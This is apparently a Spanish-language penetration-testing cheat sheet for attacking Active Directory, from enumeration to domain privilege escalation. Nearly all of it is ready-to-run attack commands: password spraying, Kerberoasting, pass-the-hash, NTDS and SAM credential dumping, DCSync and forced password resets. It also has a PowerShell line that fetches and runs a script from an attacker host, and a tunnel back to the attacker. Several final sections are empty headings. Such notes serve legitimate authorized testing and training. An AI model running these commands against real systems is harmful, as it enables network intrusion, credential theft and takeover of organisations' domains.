
# Enumeracion y acceso inicial

Esta seccion abarcara tecnicas de enumeracion desde fuera del entorno AD pasando por la validacion de usuarios y password minning hasta conseguir el acceso inicial.

## Índice
* [Herramientas](#Herramientas)
* [NMAP](#NMAP)
* [Enumeracion de usuarios](#Enumeracion-de-usuarios)
  * [SMB](#SMB)
  * [RPC](#RPC)
  * [LDAP](#LDAP)
  * [HTTP & HTTPS](#HTTP-&-HTTPS)
* [Validacion de usuarios](#Validacion-de-usuarios)
  * [Kerberos](#Kerberos)
  * [Crackmapexec](#Crackmapexec)
* [Obtencion de credenciales & hashes](#Obtencion-de-credenciales-&-hashes)
* [Dumpeo de estructura del AD](#Dumpeo-de-estructura-del-AD)
* [Acceso inicial](#Acceso-inicial)
## Herramientas
* Impacket 
* [Responder](https://github.com/SpiderLabs/Responder)

````
responder -I <interfaz> --lm -v
````
* Mimikatz
* CrackMapExec
* [Kerbrute](https://github.com/ropnop/kerbrute/releases)

````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
````
* [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

````
.\Rubeus.exe kerberoast /creduser:domain.local\<usuario> /credpassword:<password>
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt
````
* [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) & [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

````
GetNPUsers.py domain.local/ -nopass -usersfile users.txt

GetUsersSPN.py domain.local/<usuario>:<password>
GetUsersSPN.py domain.local/<usuario>:<password> -request
````
* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

````
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat
````
* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
  
````
IEX((New-Object Net.WebClient).DownloadString('https://<KALIIP/SharpHound.ps1>')
Invoke-Bloodhound -CollectionMethod All
````
* [Secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
  
````
# NTDS dump
secretsdump.py -ntds ntds.dit -system system local 

# SAM dump con autenticacion
secretsdump.py domain.local/<usuario>:<password>@<TARGET>
secretsdump.py -hashes :<hashNTLM> 'domain.local/<host>$@<domainname>'
````


## NMAP 

Al hacer un escaneo de puertos en un entorno de Active Directory en especial si el escaneo lo hacemos directamente contra el Domain Controller nos encontraremos los siguientes puertos:

+ TCP/UDP port 53: DNS
+ TCP/UDP port 88: Kerberos authentication
+ TCP/UDP port 135: RPC
+ TCP/UDP port 137-138: NetBIOS
+ TCP/UDP port 389: LDAP
+ TCP/UDP port 445: SMB
+ TCP/UDP port 464: Kerberos password change
+ TCP/UDP port 636: LDAP SSL
+ TCP/UDP port 3268-3269: Global catalog

Adicionalmente dependiendo del entorno AD este puede tener varias caracteristicas y componentes asi como interactuar con diferentes servicios y aplicaciones por lo que podemos encontrarnos mas puertos comunes:

+ TCP port 80: HTTP
+ TCP port 443: HTTPS
+ TCP port 445: SMB

De modo que tenemos dos maneras de conseguir acceso inicial al AD:
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio corriendo en el entorno AD

## Enumeracion de usuarios
### SMB

````bash
nmap -p 445 --script=smb-enum* <TARGET>  # Principalmente nos interesa enumerar usuarios
nmap -p 445  --script=smb-vuln* <TARGET> # MS17-010, MS14-025
````

* SMBMap
````bash
smbmap -H <TARGET>
````

* smbclient
````bash
smbclient -L <TARGET> -N
````

* CrackMapExec
````bash
# Escaneo del target 
crackmapexec smb www.secbank.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb <TARGET> -u "" up ""

# Connect to target using local account
crackmapexec smb <TARGET> -u 'test' -p 'pass123' --local-auth

# Pass the hash contra subredes
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Fuerza bruta y Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
````

````bash
# Enumeración de usuarios
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --users

# Enumeracion de grupos de dominio
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --groups

# Enumeracion de usuarios locales
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --local-users

# Enumeracion de recursos compartidos locales
crackmapexec smb <TARGET> -u 'user' -p 'PASSWORD' --local-auth --shares

# Sesiones activas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --sessions

# Usuarios logeados
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --lusers

# Politica de contraseñas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --pass-pol
````

````bash
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````
### RPC

Null session

`rpcclient -U "" <TARGET> -N`

Autenticacion

`rpcclient -U "user%password" <TARGET>`

Enumeracion de usuarios y grupos
````bash
enumdomusers
enumdomgroups
queryuser <0xuser>
querygroupmem 0x200 # Miembros del grupo Domain Admins
rpcclient -U "" <TARGET> -N -c "enumdomusers" # One line comand
````
Enumeracion de impresoras

`enumprinters`

Enumeracion de descripciones

`rpcclient -U "" <TARGET> -N -c "querydispinfo"`

### LDAP

Lo primero es dumpear toda la informacion que contiene LDAP, buscaremos el DomainNamingContext el cual necesitaremos para otros comandos

````bash
nmap -n -sV --script "ldap* and not brute" <TARGET>
ldapsearch -x -b "dc=domain,dc=local" "*" -H "ldap://TARGET"
````

A partir de aqui podemos seguir enumerando con ldapsearch el cual nos permitira filtrar por los distintos campos de la informacion almacenada

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName: # Enumeracion de las cuentas de usuario
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=hutch,DC=offsec" | grep description # Enumeracion de las descripciones de los usuarios las cuales en ocasiones contienen informacion sensible
````
Para enumerar constraseñas necesitamos dar con el nombre correcto del campo que las contiene, algunos ejemplos:

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep Pwd
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep userPassword
````
Teniendo unas credenciales validas podriamos acceder a credenciales de mas alto nivel como las de administrador
````
ldapsearch -D <user>@domain.local -w <password> -o ldif-wrap=no -b 'dc=domain,dc=local' -h domain.local "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
````

### HTTP & HTTPS
Al realizar la fase de reconocimiento web podemos descubrir una vulnerabilidad en la aplicacion que esta corriendo en uno de los equipos del dominio y permitirnos un acceso inicial a este, pero en otras ocasiones podemos enumerar usuarios bien en el contenido de la pagina o en paneles de login que permitan enumerar usuarios a traves de logins fallidos.

Cuando los usuarios no estan claramente definidos en el contenido web como una seccion de Contact o About Us puede que los nombres de estos coincidan con alguna palabra del contenido, en ese caso usaremos cewl para crear una wordlist personalizada. Esta wordlist posteriormente nos servira para validar usuarios contra kerberos o hacer fuerza bruta con ellos.

````bash
cewl -w wordlist.txt "http://www.test.com/index.php" --with-numbers
````

Tambien se puede dar el caso en el que los nombres de usuario esten claramente definidos en la web con formato Nombre Apellido y que haya que adaptarlo al formato que sea valido para el login. 

> Ejemplo: David Jhons -> david.johns d.jhons

Para esto podemos usar dos herramientas que nos facilitaran el proceso haciendo estas combinaciones automaticamente:

* [spindrift](https://github.com/byt3bl33d3r/SprayingToolkit)
````bash
python3 spindrift.py users.txt --format {f}{last}
python3 spindrift.py users.txt --format {f}.{last}
python3 spindrift.py users.txt --format {first}.{last}
python3 spindrift.py users.txt --format {first}{l}
python3 spindrift.py users.txt --format {first}.{l}
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3e1dce0b-3aad-4aa0-8798-1325e62e5c4b)

* [cupp](https://github.com/Mebus/cupp)
````bash
python3 cupp.py -i   # Nos abrira una consola interactiva donde ira pidiendonos los datos
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/5c0d1adf-a902-494c-8695-bf657440c5f8)

> Tambien se pueden enumerar usuarios a traves de herramientas de enumeracion orientadas a CMS o aplicaciones web como WPscan o Drupescan

## Validacion de usuarios
### Kerberos
Kerbrute utiliza la fase de pre-autenticación para enumerar usuarios y hashes de contraseñas. En esta fase nos interesa validar todos los usuarios posibles.
> Podemos tener la lista de usuarios enumerados en otros servicios en los pasos anteriores o en caso de no tener ninguno hacer fuerza bruta con un diccionario de usuarios.

````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
./kerbrute userenum --dc <TARGET> -d domain.local SecLists/Usernames/xato-net-10-million-usernames.txt
````

### Crackmapexec
````
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"

````
## Obtencion de credenciales & hashes

El proceso de recoleccion de credenciales de autenticacion se podria clasificar en 4 metodos:
* Enumeracion de servicios con credenciales almacenadas de manera insegura
  * SMB
    * Reconocimiento de estructura SYSVOL y dumpeo de Groups.xml -> `Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`
    * Archivos con credenciales almacenadas
    * Copia de seguridad del SAM
  * Credenciales guardadas en la descripcion de los usuarios en RPC y LDAP
  * Credenciales guardadas en claves de registro
    
* Explotacion de preautenticacion de kerberos
  * AS-REP Roast
  ````bash
  GetNPUsers.py test.local/ -no-pass -usersfile usernames.txt
  ````
  * Kerberoasting
  ````bash
  GetUserSPNs.py test.local/john:password123
  GetUserSPNs.py test.local/john:password123 -request
  ````

 > Para realizar este ataque el puerto 88 de Kerberos debe estar expuesto, podemos encontrarnos escenarios en los que ya hayamos conseguido un acceso inicial y veamos un usuario kerberosteable pero el puerto 88 no este expuesto, para esto hay dos soluciones:

1. Hacer el kerberoasting desde dentro con Invoke-Kerberoast.ps1 o Rubeus.
2. Forwardear el puerto 88 hacia nuestra maquina atacante.
````
.\chisel.exe client 10.10.10.10:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
````

* Conseguir una conexion del lado del servidor para obtener un hash de usuario
  * SSRF
  * SMB SCF attack
  * DNS Request
* Fuerza bruta
  * SMB CrackMapExec
  ````bash
  crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
  crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
  ````
  * RDP Crowbar
  ````bash
  crowbar -b rdp -s 10.11.1.24/32 -U userlist.txt -C passlist.txt
  ````
 ## Dumpeo de estructura del AD

 Una vez tenemos credenciales validas aunque sean de usuario con un nivel de privilegios bajo nos permitira obtener informacion importante del AD

 * Bloodhound-python
  ````bash
  bloodhound-python -c All -u <user> -p <password> -ns <host> -d test.local
  ````
 * ldapdomaindump

 > Esta herramienta nos permitira ver de una manera ordenada y visual los usuarios y grupos del dominio, además aporta informacion importante ya que podremos identificar los usuarios pertenecientes al grupo Domain Admins o al grupo de administracion remota de windows.

  ````bash
  ldapdomaindump -u test.local\<user> -p '<password>' <TARGET>
  ````
 * Claves de registro
  ````bash
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py -hashes :<hash> test.local/john:@10.10.10.1 query -keyName HKLM

    # Key names
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCU
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCR
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKU
  ````
 * SAM
 ````bash
 crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam   # Normalmente esto requerira el nivel de privilegios de un usuario Administrador
 ````

## Acceso inicial

Anteriormente hemos dicho que hay dos maneras de lograr un acceso inicial en un entorno de AD
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio corriendo en el entorno AD

### Explotacion de vulnerabilidades

* Web App
* SMB
  * MS17-010
* Phishing
  * Documento con macros maliciosos via Mail/FTP
    * ODT File
    * Office file
  * SMB
    * SCF file

### Autenticacion con credenciales/hashes

Evil-WinRM
````bash
evil-winrm -i 10.10.10.1 -u john -p password123
evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
````
Ademas, esta herramienta tiene multitud de modulos que nos facilitan transferir archivos y herramientas a la maquina victima, invocar binarios de powershell y bypassear el AMSI.

![image](https://github.com/n3masyst/Pentesting/assets/133997401/8111695e-b1a9-4160-b8d0-c51b87d4663b)

RDP
````bash
rdesktop <ip> -u <user> -p <password>
xfreerdp /v:<ip> /d:<domain> /u:<user> /p:<password>
xfreerdp /v:<ip> /d:<domain> /u:<user> /pth:<hash>
````
psexec
````bash
psexec.py <user>:<password>@<ip>
psexec.py -hashes ":<hash>" <user>@<ip>

export KRB5CCNAME=/full/path/to/john.ccache; psexec.py test.local/john@10.10.10.1 -k -no-pass # Autenticacion con ticket de kerberos exportado
````
wmiexec
````bash
wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py test.local/Administrator@10.10.10.1 -hashes :f6b7160bfc91823792e0ac3a162c9267

wmiexec.py <ip> -k -no-pass # Autenticacion con ticket de kerberos exportado
````
pth-winexe
````bash
pth-winexe -U <DOMINIO>/usuario%contraseña //<IP> cmd
pth-winexe -U <DOMINIO>/usuario%hash //<IP> cmd
````

## Escalada de privilegios

### Bloodhound

En esta seccion se describiran los vectores de escalada mas comunes enumerados por Bloodhound

#### DCSync
Normalmente podemos enumerar los derechos DCSync en Bloodhound de 3 maneras:
1. Menu > Pre-Built Analytics Queries > Find Principals with DCSync Rights
2. Una vez que tengamos el grafico de relaciones identificar el permiso GetChangesAll
3. Una vez que tengamos el grafico de relaciones identificar el permiso WriteDACL y otorgar a un usuario permisos DCSync

Una vez tengamos comprometido el usuario con dichos derechos podemos dumpear el SAM de dos maneras:

1. Desde dentro con mimikatz
````
lsadump::dcsync /domain:domain.local /user:Administrator
````

2. Desde fuera con secretsdump
````
secretsdump.py domain.local/<user>:<password>@<ip>
````

WriteDACL

> Este permiso permite a un usuario crear o eliminar usuarios o grupos asi como agregar o quitar usuarios de grupos, cambiar permisos de acceso, crear nuevos permisos entre otros...

Una vez tenemos un usuario con permisos WriteDACL o pertenecemos a un grupo de seguridad que lo tenga podemos otorgar derechos DCSync con Powerview de la siguiente manera:
````
$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('domain\<user>', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync
````
Con el derecho DCSync otorgado ya podemos dumpear el SAM con los metodos anteriores

#### ReadGMSAPassword

Este permiso permite la capacidad de leer las contraseñas del grupo Managed Service Account (MSA) las cuales son cuentas de servicio gestionadas automaticamente por el sistema operativo.

Enumeracion

El permiso en cuestion lo podemos enumerar de dos maneras:
1. Esquema de Bloodhound
2. Manualmente con powershell
````
Get-ADServiceAccount -Identity '<user>' -Properties 'msDS-ManagedPassword'
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/88c61451-a63d-4c3a-8c6f-d8000427b005)

La contraseña se nos presenta en formato bytearray, para leer el bytearray completo y por lo tanto confirmar que tenemos permiso para leer la contraseña MSA usaremos el siguiente comando:
````
(Get-ADServiceAccount -Identity '<user>' -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/f732f3e0-33d0-4fbf-93c7-c80aa48d6f66)

Explotacion

Para dumpear estas contraseñas podemos usar 2 herramientas
* [GMSAPasswordReader.exe](https://github.com/rvazarkar/GMSAPasswordReader)
Esta herramienta nos dara el hash NTLM del usuario con el que podremos autenticarnos
````
.\GMSAPasswordReader.exe --accountname <user>
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/fc81087f-29b8-49eb-bbab-402069dd5fbc)

* [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
Esta herramienta nos permitira dumpear los hashes MSA asi como obtener el hash NTLM de autenticacion a partir de crackear el bytearray anterior el cual ira hardcodeado en el codigo de la herramienta.

Metodo 1
Este metodo requerira de un paso extra para obtener el NTLM de autenticacion del usuario ya que el hash que devuelve no es de autenticacion.
````
python3 gMSADumper.py -u '<user>' -p '<password>' -l <ip> -d test.local
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3f04e52f-a11f-42ba-843d-7631964d66ee)

El hash que obtenemos de la cuenta de servicio no nos sirve para autenticarnos por lo que necesitaremos crear un ticket SPN a partir de el. Para ello usaremos la herramienta getST.py

Para obtener el ticket necesitamos aportarle los siguiente datos 

- `-dc-ip 10.10.10.1`
- `-spn www/dc.test.local` - el SPN podemos obtenerlo en la pestaña Node Info de Bloodhound o con la herramienta pywerview
- `-hashes :5e47bac787e5e1970cf9acdb5b316239` - el NTLM anterior
- `-impersonate administrator` - el usuario del que quiero el ticket
- `test.local/svc_int` - la cuenta actual

````
getST.py -spn WWW/dc.test.local -impersonate Administrator test.local/svc_int -hashes :fb49fcd5ffc6fefa70503e08c9cd8261
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbba38e2-10ab-4dbd-a79f-6ff66d61d01d)

Obtendremos un ticket TGT valido el cual podremos usar para autenticarnos usando algunos de los metodos de autenticacion de acceso inicial mencionados anteriormente.

Metodo 2

En caso de tener el bytearray de la contraseña mencionado anteriormente podemos hardcodearlo en la herramienta y esta nos lo crackeara dandonos el hash en formato NTLM valido para autenticarse.

````
data =  [1,0,0,0,36,2,0,0,16,0,18,1,20,2,28,2,181,165,82,94,231,248,193,148,89,124,204,111,76,59,48,129,55,158,201,157,255,80,32,6,126,97,84,66,219,80,85,150,223,28,16,48,182,243,11,169,40,190,102,229,143,46,89,192,35,51,0,53,18,225,2,200,215,94,130,245,131,117,147,164,159,214,199,70,76,109,240,8,194,58,138,122,10,111,151,192,253,10,156,15,98,45,216,246,234,253,136,240,182,211,31,207,90,74,59,22,94,104,11,136,52,198,149,111,201,47,26,174,149,63,79,16,233,59,75,133,74,96,134,222,75,138,228,23,235,83,202,126,115,186,136,71,27,88,114,169,216,200,233,218,223,30,240,225,12,185,104,201,251,33,145,84,168,232,251,253,85,255,134,35,253,3,4,25,170,79,32,219,120,33,34,169,111,226,123,243,55,159,121,129,88,84,27,6,245,29,154,21,218,103,94,201,86,184,130,100,96,134,45,130,253,145,84,22,240,189,2,128,17,2,138,241,217,21,216,242,191,86,158,206,238,180,153,72,44,248,217,91,200,147,71,216,111,123,10,185,37,14,61,18,167,163,241,221,139,254,47,56,180,186,160,165,0,0,131,193,78,147,51,246,57,83,121,181,169,112,213,179,71,35,167,129,148,70,243,140,4,40,195,38,224,13,7,73,120,250,9,46,25,119,59,151,213,50,120,212,133,32,220,211,182,23,99,142,178,23,72,232,103,103,71,26,39,104,199,246,8,17,237,58,60,188,248,80,93,232,20,3,68,207,7,102,151,207,13,179,62,127,89,232,112,101,122,237,125,201,44,15,125,41,148,234,18,144,199,137,8,63,197,218,8,14,220,122,98,22,45,244,214,78,125,171,126,3,122,246,195,125,83,24,93,225,241,120,17,186,196,226,170,251,135,144,113,197,154,31,71,7,128,3,222,80,106,238,60,192,109,167,223,239,128,129,151,207,32,237,228,235,30,66,58,215,220,136,46,136,59,227,227,102,53,102,191,200,91,64,253,140,198,90,133,2,33,209,61,209,223,214,179,172,7,177,75,79,200,80,66,130,21,89,107,33,254,73,209,70,178,37,238,70,250,72,143,157,215,242,77,59,111,109,9,158,60,196,210,92,16,191,219,150,77,80,180,153,34,193,33,202,165,58,156,50,174,92,199,68,136,133,58,125,0,0,177,129,38,95,103,7,0,0,177,35,86,172,102,7,0,0]
data = bytes(data)
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/9a879c43-cbe2-439e-bdf5-9de646b1c92b)

#### ForceChangePassword
>Este privilegio permite forzar el cambio de contraseña a usuarios del dominio, podemos explotarlo con PowerView de la siguiente manera:

````
$newpass = ConvertTo-SecureString 'hacker123$!' -AsPlainText -Force   # La contraseña de cumplir las politicas presentes en el AD por lo que es bueno asegurarse poniendo una compleja.
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
````

#### GenericWrite

> Este permiso otorga un conjunto genérico de derechos para realizar operaciones de escritura en un objeto o recurso en el sistema.

Se puede explotar realizando un ataque de kerberoasting con PowerView

1. Primero debemos crear un SPN para el usuario con el permiso.
````
# Podemos usar Set-DomainObject o setspn
Set-DomainObject -Identity <user> -SET @{serviceprincipalname='nonexistent/0XDF'}
setspn -a MSSQLSvc/domain.local:1433 domain.local\<user> # Este es el formato valido de SPN

# Vemos si se ha otorgado
Get-DomainUser <user> | Select serviceprinciplename
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/2ab1c5c2-a21e-4f2c-a43b-47d9e200f4f8)

2. Creamos el ticket SPN 

> Para realizar el kerberoast necesitamos un SPN con un [formato valido](https://learn.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns)
`{domain.local/john.domain.local:1337, nonexistent/0XDF}`

> Poweview tiene la utilidad Get-DomainSPNTicket para realizar el kerberoast pero requiere un objeto de credencial independientemente que nos encontremos en la sesion del usuario.

````
$pass = ConvertTo-SecureString 'hacker123$!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('domain.local\<user>', $pass)
Get-DomainSPNTicket -SPN "MSSQLSvc/domain.local:1433" -Credential $Cred
````

#### ACL

#### Constrained delegation


### Kerberoasting

Extraccion de tickets de kerberos

#### Invoke-Kerberoast.ps1
#### Rubeus.exe

### Golden Tickets
### NTLMv1
### SAM Dump
### Grupos de dominio explotables
### Abuso de GPOs

